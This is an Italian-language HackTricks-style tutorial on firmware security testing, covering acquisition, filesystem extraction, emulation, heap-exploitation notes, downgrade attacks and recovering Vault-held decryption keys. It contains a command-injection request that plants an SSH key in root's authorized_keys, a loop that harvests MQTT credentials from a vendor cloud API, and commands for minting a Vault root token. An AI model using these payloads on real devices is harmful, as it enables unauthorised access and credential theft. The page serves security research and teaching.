# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È memorizzato nella memoria permanente, garantendo al dispositivo l'accesso alle istruzioni fondamentali fin dal momento dell'accensione, fino all'avvio del sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio fondamentale per identificare le vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un passaggio iniziale fondamentale per comprendere la struttura di un dispositivo e le tecnologie che utilizza. Questo processo comprende la raccolta di dati su:

- L'architettura della CPU e il sistema operativo in esecuzione
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e posizioni del codice sorgente
- Librerie esterne e tipi di licenza
- Cronologia degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni della sicurezza e vulnerabilità identificate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di qualsiasi componente software open-source disponibile tramite processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statiche gratuite che possono essere utilizzate per individuare potenziali problemi.

## **Acquisizione del firmware**

Il firmware può essere ottenuto in diversi modi, ognuno con il proprio livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Creandolo** a partire dalle istruzioni fornite
- **Scaricandolo** dai siti ufficiali di supporto
- Utilizzando query **Google dork** per trovare file firmware ospitati online
- Accedendo direttamente al **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- Eseguendo lo **sniffing** delle richieste di aggiornamento nelle comunicazioni del dispositivo
- Identificando e utilizzando **endpoint di aggiornamento hardcoded**
- Eseguendo il **dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memoria, quando tutto il resto fallisce, utilizzando strumenti hardware appropriati

### Log solo tramite UART: forzare una root shell tramite l'env di U-Boot nella flash

Se UART RX viene ignorato (solo log), puoi comunque forzare una init shell **modificando offline il blob dell'ambiente di U-Boot**:<sup>[[6]](#references)</sup>

1. Esegui il dump della flash SPI con una clip SOIC-8 e un programmatore (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Individua la partizione dell'env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env di U-Boot** per il blob.
3. Riscrivi solo la partizione dell'env e riavvia; dovrebbe comparire una shell sulla UART.

Questa tecnica è utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione dell'env è scrivibile tramite accesso esterno alla flash.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per capire come gestirlo. Esistono diversi strumenti che puoi utilizzare a questo scopo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con questi strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`: se l'entropia è bassa, probabilmente non è cifrata. Se l'entropia è alta, probabilmente è cifrata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre i **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il Filesystem

Con gli strumenti commentati in precedenza, come `binwalk -ev <bin>`, dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk solitamente lo estrae all'interno di una **cartella denominata in base al tipo di filesystem**, che generalmente è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del Filesystem

A volte binwalk **non avrà il magic byte del filesystem nelle proprie firme**. In questi casi, usa binwalk per **trovare l'offset del filesystem e ricavare il filesystem compresso** dal binario, quindi **estrai manualmente** il filesystem in base al suo tipo utilizzando i passaggi riportati di seguito.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **comando dd** per effettuare il carving del filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (utilizzato nell'esempio precedente)

`$ unsquashfs dir.squashfs`

I file si troveranno successivamente nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del Firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di analisi iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare i dati binari e comprendere i dettagli delle partizioni e del filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di cifratura dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l'assenza di cifratura, mentre un'alta entropia indica una possibile cifratura o compressione.

Per estrarre i **file incorporati**, sono consigliati strumenti e risorse come la documentazione di **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Usando `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory denominata in base al tipo di filesystem (ad esempio, squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa dell'assenza dei magic bytes, è necessaria un'estrazione manuale. Questa consiste nell'usare `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per estrarre il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (ad esempio squashfs, cpio, jffs2, ubifs), vengono utilizzati comandi diversi per estrarre manualmente i contenuti.

### Analisi del filesystem

Dopo aver estratto il filesystem, inizia la ricerca di vulnerabilità. Vengono analizzati daemon di rete insicuri, credenziali hardcoded, endpoint API, funzionalità dei server di aggiornamento, codice non compilato, script di avvio e binari compilati per l'analisi offline.

Le **posizioni** e gli **elementi principali** da esaminare includono:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script alla ricerca di potenziali vulnerabilità
- Binari embedded per ulteriori analisi
- Server web e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ed [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati trovati nel filesystem devono essere analizzati attentamente alla ricerca di vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per i binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Acquisizione della configurazione cloud e delle credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica del dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware, potresti scoprire che `<token>` viene derivato localmente dal device ID utilizzando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come esadecimale maiuscolo

Questo design consente a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, spesso rivelando credenziali MQTT in chiaro e prefissi dei topic.

Workflow pratico:

1) Estrarre il deviceId dai log di boot UART

- Collegare un adattatore UART da 3,3 V (TX/RX/GND) e acquisire i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il pattern dell'URL della configurazione cloud e l'indirizzo del broker, ad esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Ricava il token in Bash e converti il digest in maiuscolo:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccolta della configurazione cloud e delle credenziali MQTT

- Componi l'URL e recupera il JSON con curl; analizzalo con jq per estrarre i secret:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Sfrutta MQTT in chiaro e ACL dei topic deboli (se presenti)

- Usa le credenziali recuperate per iscriverti ai topic di manutenzione e cercare eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare gli ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- È possibile iterare sugli ID candidati, derivare i token e recuperare le configurazioni programmaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottenere sempre un'autorizzazione esplicita prima di tentare un'enumerazione su larga scala.
- Quando possibile, preferire l'emulazione o l'analisi statica per recuperare i segreti senza modificare l'hardware target.


Il processo di emulazione del firmware consente l'**analisi dinamica** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può incontrare difficoltà legate alle dipendenze dall'hardware o dall'architettura, ma trasferire il root filesystem o specifici binari su un dispositivo con architettura ed endianness compatibili, come un Raspberry Pi, oppure su una macchina virtuale preconfigurata, può facilitare ulteriori test.

### Emulazione di singoli binari

Per esaminare singoli programmi, è fondamentale identificare l'endianness e l'architettura CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario con architettura MIPS, è possibile utilizzare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian), viene utilizzato `qemu-mips`, mentre per i binary little-endian si sceglierebbe `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binary ARM, il processo è simile: per l'emulazione viene utilizzato l'emulatore `qemu-arm`.

### Emulazione dell'intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione completa del firmware, automatizzando il processo e agevolando l'analisi dinamica.

## Analisi dinamica nella pratica

In questa fase, per l'analisi viene utilizzato un ambiente con dispositivo reale o emulato. È essenziale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni con l'hardware, rendendo occasionalmente necessari riavvii dell'emulazione. L'analisi dovrebbe esaminare nuovamente il filesystem, sfruttare le pagine web e i servizi di rete esposti ed esplorare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per identificare potenziali vulnerabilità backdoor.

## Tecniche di analisi a runtime

L'analisi a runtime consiste nell'interagire con un processo o un binary nel suo ambiente operativo, utilizzando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded privi di un debugger completo, **copia un `gdbserver` collegato staticamente** sul dispositivo e collegati da remoto:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT, lo stack RF è spesso suddiviso tra un **radio MCU** e un processo Linux in userland. Un workflow utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **RF frame** via radio
2. **controller-side parser** sul radio MCU
3. **serial/UART text or TLV protocol** inoltrato a Linux (per esempio `/dev/tty*`)
4. **application dispatcher** nel daemon principale
5. **protocol-specific handler / state machine**

Questa architettura crea due obiettivi di reversing invece di uno. Se il controller converte i radio frame binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, recuperare:

- I **message groups** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** rispetto a quelli generati dal controller stesso
- Gli esatti campi discriminator specifici del produttore (per esempio Zigbee `manufacturer_code` e `cluster_command` personalizzati)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download del firmware/model

Specificamente per Zigbee, catturare il traffico di pairing e verificare se il target utilizza ancora la **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, lo sniffing del traffico di commissioning potrebbe esporre la **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione; verificare quindi se il dispositivo testato li applica effettivamente.

### Handler di protocollo specifici del produttore e raggiungibilità controllata dalla FSM

I comandi Zigbee/ZCL specifici del vendor sono spesso un obiettivo migliore rispetto ai cluster standardizzati, perché alimentano **codice di parsing personalizzato** e **FSM** interne con una validazione meno collaudata.<sup>[[8]](#references)</sup>

Workflow pratico:

- Fare il reversing del command dispatcher fino a trovare il **vendor-only handler**.
- Recuperare le tabelle di **FSM state**, **event**, **check**, **action** e **next-state**.
- Identificare gli **stati transitori** che avanzano automaticamente e i rami di retry/error che alla fine eseguono il reset o liberano lo stato controllato dall’attacker.
- Confermare quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di presumere che l’handler difettoso sia sempre raggiungibile.

Per i protocolli sensibili al timing, il packet replay da un framework Python potrebbe essere troppo lento. Un approccio più affidabile consiste nell’emulare un dispositivo legittimo su hardware reale (per esempio un **nRF52840**) con uno stack di livello vendor, così da esporre gli **endpoints**, gli **attributi** e il timing corretto del commissioning.

### Classe di bug nei download frammentati nei daemon embedded

Una classe ricorrente di bug del firmware si presenta nei **download frammentati di blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Il **first fragment** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi validano solo i campi **packet-local** controllati dall’attacker, come `packet_total_size >= offset + chunk_len`.
3. La copia utilizza `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare il limite rispetto alla **dimensione originariamente allocata**.

Questo consente a un attacker di inviare:

- Un primo frammento valido con una **dimensione totale dichiarata ridotta**, per forzare una piccola allocazione sull’heap.
- Un frammento successivo con l’**offset previsto**, ma con un `chunk_len` maggiore.
- Una dimensione packet-local contraffatta che soddisfa i nuovi controlli, causando comunque un overflow del buffer allocato originariamente.

Quando il percorso vulnerabile è protetto dalla logica di commissioning, l’exploitation deve includere una **device emulation** sufficiente a portare il target nello stato previsto di model-download o blob-download prima di inviare i frammenti malformati.

### Trigger di `free()` guidati dal protocollo

Nei daemon embedded, il modo più semplice per attivare l’exploitation dei metadati dell’heap spesso non consiste nell’“attendere la pulizia”, ma nel **forzare la gestione degli errori propria del protocollo**:<sup>[[8]](#references)</sup>

- Inviare frammenti successivi malformati per portare la FSM negli stati di **retry** o **error**.
- Superare la soglia di retry affinché il daemon esegua il **reset del contesto** e liberi il buffer corrotto.
- Utilizzare questo `free()` prevedibile per attivare primitive lato allocator prima che il processo termini per motivi non correlati.

Ciò è particolarmente utile contro allocator di tipo **musl/uClibc/dlmalloc** in Linux embedded, nei quali la corruzione dei metadati dei chunk può trasformare la logica unlink/unbin in una write primitive. Un pattern stabile consiste nel corrompere un **campo size** per reindirizzare il percorso dell’allocator verso **fake chunk predisposti all’interno del buffer overflowato**, invece di sovrascrivere immediatamente i reali puntatori dei bin causando il crash del processo.

## Binary Exploitation e Proof-of-Concept

Lo sviluppo di un PoC per le vulnerabilità identificate richiede una conoscenza approfondita dell’architettura del target e la programmazione in linguaggi di livello inferiore. Le protezioni del runtime binario nei sistemi embedded sono rare, ma quando sono presenti possono rendersi necessarie tecniche come il Return Oriented Programming (ROP).

### Note sull’exploitation dei fastbin di uClibc (Linux embedded)

- **Fastbin + consolidation:** uClibc utilizza fastbin simili a quelli di glibc. Un’allocazione grande successiva può attivare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (size valida, `fd = 0` e chunk circostanti considerati “in use”).<sup>[[6]](#references)</sup>
- **Binary non-PIE con ASLR:** se ASLR è abilitato ma il binary principale è **non-PIE**, gli indirizzi `.data/.bss` all’interno del binary sono stabili. È possibile puntare a una regione che assomiglia già a un header valido di heap chunk, per collocare un’allocazione fastbin su una **function pointer table**.
- **NUL che interrompe il parser:** quando viene effettuato il parsing del JSON, un `\x00` nel payload può interrompere il parsing mantenendo i byte controllati dall’attacker successivi, utili per uno stack pivot/ROP chain.
- **Shellcode tramite `/proc/self/mem`:** una ROP chain che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può collocare shellcode eseguibile in un mapping noto e trasferire il controllo a esso.

## Operating System preparati per il Firmware Analysis

Operating System come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per il firmware security testing, dotati degli strumenti necessari.

## OS preparati per analizzare il Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutare a eseguire security assessment e penetration testing di dispositivi Internet of Things (IoT). Fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già caricati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per l’embedded security testing basato su Ubuntu 18.04 e dotato di strumenti per il firmware security testing.

## Firmware Downgrade Attacks e meccanismi di Update insicuri

Anche quando un vendor implementa controlli crittografici delle firme per le immagini firmware, la **protezione dal version rollback (downgrade) viene frequentemente omessa**. Quando il boot- o recovery-loader verifica solo la firma con una public key incorporata, ma non confronta la *versione* (o un contatore monotono) dell’immagine in fase di flashing, un attacker può installare legittimamente un **firmware più vecchio e vulnerabile che possiede ancora una firma valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Workflow tipico dell’attacco:

1. **Ottenere un’immagine firmata più vecchia**
* Recuperarla dal portale pubblico di download del vendor, dal CDN o dal sito di supporto.
* Estrarla dalle applicazioni mobile/desktop associate (per esempio all’interno di un Android APK in `assets/firmware/`).
* Recuperarla da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Caricare o fornire l’immagine al dispositivo** tramite qualsiasi update channel esposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, ecc.
* Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e attivano il recovery/upgrade.
3. Dopo il downgrade, sfruttare una vulnerabilità corretta nella release più recente (per esempio un filtro contro la command injection aggiunto successivamente).
4. Facoltativamente, eseguire nuovamente il flashing dell’immagine più recente o disabilitare gli update per evitare il rilevamento dopo aver ottenuto la persistenza.

### Esempio: Command Injection dopo il Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (downgradato), il parametro `md5` viene concatenato direttamente a un comando shell senza sanificazione, consentendo l'iniezione di comandi arbitrari (in questo caso, abilitando l'accesso root tramite chiavi SSH). Le versioni successive del firmware hanno introdotto un filtro di base per i caratteri, ma l'assenza di una protezione contro il downgrade rende la correzione inefficace.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobile

Molti vendor includono immagini firmware complete nelle relative applicazioni mobile companion, affinché l'app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non crittografati nell'APK/APEX, in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o anche il semplice `unzip` consentono di estrarre immagini firmate senza interagire con l'hardware fisico.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass dell'anti-rollback gestito solo dall'updater nei design con slot A/B

Alcuni vendor implementano effettivamente un **ratchet** anti-downgrade, ma solo nella logica dell'*updater* (per esempio una routine UDS su CAN, un comando di recovery o un agent OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/il CRC dell'immagine e si fida della partition table o dei metadati dello slot, la protezione dal rollback può ancora essere bypassata.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore della versione sia un **security ratchet** / contatore monotono.
- L'updater confronta il ratchet dell'immagine con un valore memorizzato nello storage persistente e rifiuta le immagini firmate più vecchie.
- Il **bootloader** non analizza quel ratchet e verifica solo header, CRC e firma prima di eseguire lo slot selezionato.
- L'attivazione dello slot viene memorizzata separatamente in una partition table o in un generation counter per slot e non è legata crittograficamente all'esatto digest del firmware che è stato validato.

Questo crea una primitive **validate-one-image / boot-another-image** nei sistemi dual-slot. Se l'attacker riesce a fare in modo che l'updater contrassegni lo slot B come destinazione del boot successivo usando un'immagine firmata corrente e può successivamente sovrascrivere lo slot B prima del reboot, il bootloader potrebbe comunque eseguire l'immagine sottoposta a downgrade, perché si fida solo dei metadati dello slot già salvati.

Pattern di abuso comune:

1. Caricare un firmware **current signed** nello slot passivo ed eseguire la normale routine di validazione/switch, in modo che il layout contrassegni quello slot come attivo successivo.
2. **Non eseguire ancora il reboot**. Rientrare nella routine di preparazione/cancellazione dello slot nella stessa sessione.
3. Sfruttare una logica obsoleta relativa allo stato del boot o alla selezione dello slot, in modo che l'updater cancelli lo **stesso slot fisico** appena promosso.
4. Scrivere in quello slot un firmware **più vecchio ma ancora firmato**.
5. Saltare la routine di validazione che applica il ratchet ed eseguire direttamente il reboot.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità ed esegue l'immagine precedente.

Elementi da cercare durante il reverse engineering delle implementazioni di update A/B:

- Selezione dello slot derivata da **flag di boot** che non vengono aggiornati dopo uno switch riuscito.
- Una routine in stile `prepare_passive_slot()` che cancella uno slot in base a uno stato obsoleto invece del **layout attualmente salvato**.
- Una funzione in stile `part_write_layout()` che incrementa solo un **generation counter** / flag active e non memorizza l'hash dell'immagine validata.
- Controlli del ratchet implementati in userspace o nel codice dell'updater, ma **non** nelle fasi ROM / bootloader / secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come bootable anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di update

* Il transport/l'autenticazione dell'*update endpoint* è adeguatamente protetto (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L'immagine viene verificata all'interno di una secure boot chain (per esempio con le firme controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell'updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **legati al digest/alla versione del firmware validato**, oppure uno slot può essere modificato dopo la promozione?
* Dopo che uno switch dello slot è riuscito, il dispositivo è obbligato a eseguire il reboot oppure le routine successive di update/cancellazione sono ancora raggiungibili nella stessa sessione?
* Il codice userland esegue ulteriori controlli di coerenza (per esempio partition map consentita, numero del modello)?
* I flussi di update *parziali* o di *backup* riutilizzano la stessa logica di validazione?

> 💡  Se manca uno qualsiasi degli elementi precedenti, la piattaforma è probabilmente vulnerabile agli attacchi di rollback.

## Firmware vulnerabile per fare pratica

Per esercitarsi nella scoperta di vulnerabilità nel firmware, usare i seguenti progetti di firmware vulnerabili come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperare le chiavi di decrittografia del firmware dallo stato KMS/Vault embedded

Quando un'immagine di update combina piccoli metadati in plaintext con un grande blob ad alta entropia, eseguire il container triage prima di effettuare qualsiasi brute-forcing:<sup>[[1]](#references)</sup>

- Eseguire il dump di header, offset e limiti di riga con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato OpenSSL `enc`: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che decodifica esattamente a `256` byte è un forte indizio che si stia osservando un ciphertext RSA-2048 che avvolge una password/session key casuale del firmware.
- Materiale PGP detached nello stesso file spesso protegge solo l'autenticità; non presumere che sia il meccanismo di confidenzialità.

Se la ricerca statica delle chiavi (`grep`, `strings`, ricerche PEM/PGP) non produce risultati, eseguire il reverse engineering del **percorso operativo di decrittografia** invece di cercare soltanto le chiavi private:

- Decompilare il binario dell'updater / management e tracciare chi legge il blob cifrato, quale helper/API lo unwraps e quale nome logico della chiave richiede.
- Cercare nel root filesystem estratto lo stato KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file di unità e agli script init.
- Considerare il plaintext `vault operator unseal ...`, le recovery key, i bootstrap token o gli script locali di auto-unseal KMS come equivalenti al materiale della chiave privata.

Se l'appliance include il binario Vault originale e il backend di storage, riprodurre quell'ambiente è solitamente più semplice che reimplementare gli internals di Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Con root sul KMS clonato:

